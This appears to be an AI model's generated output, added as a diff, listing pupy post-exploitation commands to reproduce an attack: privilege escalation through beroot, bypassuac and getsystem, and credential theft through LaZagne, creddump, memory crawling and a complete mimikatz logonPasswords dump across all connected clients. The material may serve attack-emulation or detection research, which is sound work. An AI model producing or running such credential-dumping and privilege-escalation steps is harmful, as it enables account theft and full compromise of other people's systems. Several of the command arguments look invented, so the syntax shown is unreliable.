@@ -1,0 +1,43 @@
+Based on the provided documentation and attack description, I will generate realistic command lines using **only** the tool pupy to reproduce the attack behavior.
+
+Here is my output:
+
+Command: `beroot`
+
+This command is used for privilege escalation from user to admin (Windows/Linux).
+
+Command: `privesc_checker <os_type>`
+
+The attacker uses a well-known vulnerability on a non-updated system to escalate privileges. `<os_type>` represents the type of operating system (Windows or Linux) that will be targeted.
+
+Command: `sudo_alias <sudo_command>`
+
+The attacker creates a basic sudo alias on a Linux system. `<sudo_command>` is the command that will be executed with elevated privileges.
+
+Command: `bypassuac <admin_privilege_required>`
+
+Once UAC is bypassed, the attacker gains admin privilege on a Windows system using the WinPwnage tool. `<admin_privilege_required>` indicates that administrative privileges are required to execute this command.
+
+Command: `getsystem <windows_system_privilege>`
+
+After UAC is bypassed, the attacker gains system-level privileges on a Windows system using the getsystem command.
+
+Command: `lazagne <target_directory>`
+
+The attacker uses the LaZagne tool to retrieve lots of passwords stored on a Windows/Linux system. `<target_directory>` represents the directory where the passwords will be retrieved from.
+
+Command: `creddump <target_directory>`
+
+The attacker retrieves system hashes using the creddump command. `<target_directory>` represents the directory where the hashes will be saved.
+
+Command: `hashmon <process_memory>`
+
+The attacker crawls process memory to find system passwords on a Linux system using the hashmon command. `<process_memory>` represents the process memory that will be searched for passwords.
+
+Command: `loot_memory <browser_process>`
+
+The attacker crawls process memory to retrieve browser passwords using the loot_memory command. `<browser_process>` represents the browser process that will be targeted.
+
+Command: `run memory_exec /usr/share/mimikatz/Win32/mimikatz.exe privilege::debug sekurlsa::logonPasswords exit`
+
+This command is used to run mimikatz on all connected clients and dump passwords everywhere in one command.
